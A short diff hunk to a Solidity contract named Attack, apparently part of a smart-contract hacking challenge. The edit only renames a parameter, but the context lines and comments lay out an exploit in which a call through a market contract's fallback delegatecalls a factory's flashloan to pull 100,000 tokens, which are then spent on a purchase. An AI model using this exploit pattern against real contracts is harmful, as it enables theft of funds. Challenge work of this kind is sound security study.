@@ -29,7 +29,7 @@ contract Attack {
     // attack (msg.sender1) (call)=> carMarket.fallback() (msg.sender2)  (delegatecall)=> carFactory.flashloan()
     // so when carToken.transfer(msg.sender, amount) is called in flashloan()
     // from: msg.sender2 (carMarket), to: msg.sender1 (attack) value: 100_000 ether
-    function receivedCarToken(address factory) public {
+    function receivedCarToken(address _factory) public {
         carToken.approve(address(carMarket), 100_000 ether);
         carMarket.purchaseCar("black", "G63", "GOD");
     }
